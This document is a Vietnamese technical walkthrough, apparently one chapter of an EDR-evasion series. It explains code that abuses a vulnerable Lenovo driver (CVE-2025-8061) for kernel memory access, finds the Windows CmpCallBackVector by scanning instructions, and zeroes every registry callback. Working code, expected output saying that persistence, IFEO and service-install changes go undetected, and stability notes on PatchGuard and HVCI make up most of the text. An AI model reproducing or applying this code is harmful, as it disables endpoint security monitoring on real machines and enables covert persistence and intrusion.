# 11 — CmRegisterCallback Removal (Registry Notification Callbacks)

**File:** `11_cm_callback.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Kernel VA read/write + RIP-relative LEA scan  
**Output:** EDR không còn nhận thông báo về registry operations (create key, set value, delete, v.v.)

---

## Mục tiêu

Locate `CmpCallBackVector` — mảng 100 slot chứa các `EX_CALLBACK` của registry callbacks — và zero toàn bộ slot đó. Kết quả: EDR/AV không còn biết khi nào registry thay đổi → bypass persistence detection, IFEO injection detection, driver installation detection.

---

## Lý thuyết nền

### CmRegisterCallback — Registry Monitoring

EDR và AV gọi `CmRegisterCallback(fn, ctx, &cookie)` để đăng ký callback nhận notification về mọi registry operation:

| Event | Detection |
|-------|-----------|
| Create key dưới `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Persistence |
| Set `AppInit_DLLs` hoặc `IFEO\Debugger` | DLL injection prep |
| Create key dưới `HKLM\SYSTEM\CurrentControlSet\Services\*` | Driver/service install |
| Modify security keys | Privilege escalation detection |

### CmpCallBackVector — Internal Storage

Windows kernel lưu registry callbacks trong một **array** (không phải linked list) có tên `CmpCallBackVector`:

```
CmpCallBackVector[100]:
    [0]   EX_CALLBACK  (8 bytes, ExFastRef format)
    [1]   EX_CALLBACK  (8 bytes, ExFastRef format)
    ...
    [99]  EX_CALLBACK  (8 bytes, ExFastRef format)
```

### EX_CALLBACK và EX_CALLBACK_ROUTINE_BLOCK

```
EX_CALLBACK (8 bytes, ExFastRef):
    bits[63:4] = pointer đến EX_CALLBACK_ROUTINE_BLOCK (16-byte aligned)
    bits[3:0]  = reference count

EX_CALLBACK_ROUTINE_BLOCK:
    +0x000  RefCount   EX_RUNDOWN_REF  (8 bytes)
    +0x008  Function   PEX_CALLBACK_FUNCTION   ← địa chỉ thực của callback
    +0x010  Context    PVOID           ← context được truyền vào CmRegisterCallback
```

Để remove callback: zero toàn bộ 8-byte EX_CALLBACK slot. Kernel skip null entries khi iterating.

### Tìm CmpCallBackVector

Array này **không được export** trực tiếp. Ta tìm nó bằng cách:

1. `CmRegisterCallbackEx` là exported function từ ntoskrnl
2. Scan code của nó (và callees qua CALL follow) tìm `LEA Rx,[RIP+imm32]` instructions
3. Mỗi LEA target trong `.data` là candidate → validate bằng cách đọc 16 slots đầu
4. Nếu slots chứa valid ExFastRef kernel pointers → đây là `CmpCallBackVector`

---

## Giải thích code từng dòng

### Hằng số

```cpp
#define CM_SLOTS 100  // CmpCallBackVector có đúng 100 slot
```

100 là hardcoded trong Windows kernel từ Vista trở đi — limit tối đa cho registry callbacks.

### FindCmpCallBackVector() — Algorithm

```cpp
static uint64_t FindCmpCallBackVector(uint64_t cr3,
                                       uint64_t func_va,      // VA của CmRegisterCallbackEx
                                       uint64_t data_va, uint32_t data_size)
{
    uint64_t scan_targets[8] = { func_va };
    int n_targets = 1;
    // Queue tối đa 8 functions để scan (function gốc + callee)
```

### Bước 1: scan code và follow CALLs

```cpp
    for (int t = 0; t < n_targets; t++) {
        uint64_t scan_va = scan_targets[t];
        uint8_t code[768] = {};
        KernelRead(cr3, scan_va, code, sizeof(code));  // đọc 768 bytes code

        for (int i = 0; i < (int)sizeof(code) - 7; i++) {
            // Follow CALL E8 imm32 để scan sub-functions
            if (code[i] == 0xE8 && n_targets < 8) {
                int32_t rel = *(int32_t*)(code + i + 1);
                uint64_t callee = scan_va + i + 5 + (int64_t)rel;
                // callee VA = địa chỉ instruction tiếp theo + signed offset
                
                if ((callee >> 48) == 0xFFFF) {  // phải là kernel VA
                    // De-duplicate: không thêm nếu đã có trong queue
                    bool dup = false;
                    for (int k = 0; k < n_targets; k++)
                        if (scan_targets[k] == callee) { dup = true; break; }
                    if (!dup) scan_targets[n_targets++] = callee;
                }
            }
```

`CmRegisterCallbackEx` thường gọi internal helper (ví dụ `CmpRegisterCallbackInternal`) thực sự access array. CALL follow đảm bảo ta scan cả callee đó.

### Bước 2: tìm LEA [RIP+X] instruction

```cpp
            // Detect LEA REX.W Rx,[RIP+imm32]
            uint8_t pfx = code[i];
            uint8_t op  = code[i+1];
            if ((pfx & 0xF0) != 0x40) continue;  // phải có REX prefix (0x40-0x4F)
            if (op != 0x8D) continue;             // 0x8D = LEA opcode
            uint8_t modrm = code[i+2];
            if ((modrm & 0xC7) != 0x05) continue;
            // ModRM: bits[7:6]=00 (mod=memory), bits[2:0]=101 (rm=101 → RIP-relative)
            // 0xC7 mask: giữ bits 7,6,2,1,0 → 0xC7 & modrm phải == 0x05
```

LEA encoding:
```
byte 0: REX prefix (0x48=REX.W, 0x4C=REX.W+REX.R, v.v.)
byte 1: 0x8D (LEA)
byte 2: ModRM (mod=00, reg=any, rm=101 → RIP-relative)
byte 3-6: imm32 (signed offset từ RIP của instruction tiếp theo)
```

### Bước 3: tính target VA

```cpp
            int32_t  imm32  = *(int32_t*)(code + i + 3);
            uint64_t target = scan_va + i + 7 + (int64_t)imm32;
            // RIP tại instruction tiếp theo = scan_va + i + 7
            // (REX=1 + LEA=1 + ModRM=1 + imm32=4 = 7 bytes)
            // target_va = RIP + sign_extended(imm32)
```

### Bước 4: validate là CmpCallBackVector

```cpp
            // Target phải nằm trong .data của ntoskrnl
            if (target < data_va || target + CM_SLOTS * 8 > data_va + data_size) continue;
            // Cần ít nhất 100*8 = 800 bytes từ target đến cuối .data

            // Đọc 16 slots đầu tiên
            uint64_t slots[16] = {};
            KernelRead(cr3, target, slots, sizeof(slots));
            
            bool has_valid   = false;
            bool all_plausible = true;
            for (int k = 0; k < 16; k++) {
                uint64_t v = slots[k];
                if (v == 0) continue;  // empty slot — OK
                uint64_t ptr = v & ~0xFULL;  // clear low 4 bits (ExFastRef refcount)
                if ((ptr >> 48) == 0xFFFF) { has_valid = true; continue; }
                // Phải là kernel VA: bits[63:48] = 0xFFFF
                all_plausible = false; break;  // giá trị kỳ lạ → false positive
            }
            if (!all_plausible) continue;
            if (!has_valid) continue;  // tất cả null → array rỗng, không hữu ích
            
            printf("    [+] CmpCallBackVector: VA=0x%016llX\n", target);
            return target;
```

Validation: mỗi non-null slot phải là valid ExFastRef (kernel pointer với low 4 bits = refcount). Nếu có giá trị không phải kernel pointer → data ngẫu nhiên, skip.

### Main: scan từ nhiều exported functions

```cpp
static const char *scan_exports[] = {
    "CmRegisterCallbackEx", "CmUnRegisterCallback", "CmRegisterCallback", nullptr
};

uint64_t vec_va = 0;
for (int i = 0; scan_exports[i] && !vec_va; i++) {
    uint64_t fn = GetNtExport(cr3, nt.base, scan_exports[i]);
    if (!fn) continue;
    printf("    [*] Scanning %s @ 0x%016llX...\n", scan_exports[i], fn);
    vec_va = FindCmpCallBackVector(cr3, fn, nt.data_va, nt.data_size);
}
```

Fallback strategy: nếu `CmRegisterCallbackEx` không có LEA trực tiếp (vì nó gọi internal function qua indirect call), thử `CmUnRegisterCallback` thường ngắn hơn và access array trực tiếp hơn.

### Enumerate: đọc Function pointer từ EX_CALLBACK_ROUTINE_BLOCK

```cpp
for (int i = 0; i < CM_SLOTS; i++) {
    uint64_t slot_va = vec_va + (uint64_t)i * 8;  // mỗi slot 8 bytes
    uint64_t excb = 0;
    if (!KernelReadU64(cr3, slot_va, &excb)) continue;
    if (!excb) continue;  // null slot — skip
    
    uint64_t rb_ptr = excb & ~0xFULL;  // clear ExFastRef refcount bits
    // rb_ptr = pointer đến EX_CALLBACK_ROUTINE_BLOCK
    
    uint64_t fn_va = 0;
    KernelReadU64(cr3, rb_ptr + 0x008, &fn_va);
    // EX_CALLBACK_ROUTINE_BLOCK.Function tại +0x008
    
    printf("  [%02d] ExCb=0x%016llX  RoutineBlock=0x%016llX  Fn=0x%016llX\n",
           i, excb, rb_ptr, fn_va);
}
```

Để hiển thị: dereference ExFastRef pointer → đọc `.Function` tại +0x008 của EX_CALLBACK_ROUTINE_BLOCK.

### Zero và restore

```cpp
// Zero
for (int i = 0; i < CM_SLOTS; i++) {
    uint64_t slot_va = vec_va + (uint64_t)i * 8;
    uint64_t excb = 0;
    if (!KernelReadU64(cr3, slot_va, &excb) || !excb) continue;
    
    // Save for restore
    g_saved[g_saved_count].slot = i;
    g_saved[g_saved_count].orig_excb = excb;
    g_saved[g_saved_count].slot_va = slot_va;
    
    // Zero toàn bộ 8-byte ExFastRef slot
    if (KernelWriteU64(cr3, slot_va, 0)) {
        uint64_t rb = 0xDEAD;
        KernelReadU64(cr3, slot_va, &rb);
        if (rb == 0) {
            g_saved_count++;
            zeroed++;
        } else {
            printf("  [%02d] write didn't stick (HVCI?)\n", i);
        }
    }
}

// Restore
for (int i = 0; i < g_saved_count; i++) {
    KernelWriteU64(cr3, g_saved[i].slot_va, g_saved[i].orig_excb);
    // Ghi lại ExFastRef value gốc (bao gồm cả refcount bits thấp)
}
```

---

## Kết quả expected

```
[*] CmpCallBackVector — 100 slots:
  [00] ExCb=0xFFFF80038ABC1002  RoutineBlock=0xFFFF80038ABC1000  Fn=0xFFFF80021234ABCD
  [01] ExCb=0xFFFF80039DEF2004  RoutineBlock=0xFFFF80039DEF2000  Fn=0xFFFF80027654EFAB
  [02] ExCb=0x0000000000000000  (empty)
  ...

[*] Press Enter to ZERO all 2 CmCallback slots...

  [00] zeroed
  [01] zeroed

[+] 2/2 callback slots zeroed
[+] Registry monitoring by EDR/AV is now DISABLED:
    - persistence via RunKey goes undetected
    - IFEO/AppInit_DLLs changes go undetected
    - service installation goes undetected
```

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| PatchGuard | **Không check** — CmpCallBackVector là data-only, stable |
| HVCI | Không ảnh hưởng — .data pages không protected |
| Scan fail | Nếu LEA không tìm thấy (compiler optimization thay đổi), thử CmUnRegisterCallback |
| 100-slot limit | Windows hardcode 100 slots từ Vista — không thay đổi |
| EDR re-register | Một số EDR detect và re-register, nhưng chỉ khi có registry event để trigger |

---

## Tóm tắt flow

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .data bounds

Try each: CmRegisterCallbackEx, CmUnRegisterCallback, CmRegisterCallback
    GetNtExport(fn_name) → fn_va
    FindCmpCallBackVector(cr3, fn_va, .data bounds):
        Scan 768 bytes code + callees (CALL follow)
        Find LEA [RIP+X] → target in .data, target + 800 bytes fit
        Validate 16 slots: kernel ExFastRef pointers
        → vec_va (CmpCallBackVector)

Enumerate 100 slots:
    For each non-null slot:
        read ExCb → rb_ptr = ExCb & ~0xF
        read rb_ptr+0x008 → Function VA
        Print

[User confirms]

Zero pass:
    For each non-null slot:
        KernelWriteU64(slot_va, 0)
        Readback verify
        Save original excb for restore

[+] Registry callbacks removed

[Press Enter]

Restore:
    For each saved slot:
        KernelWriteU64(slot_va, orig_excb)
```
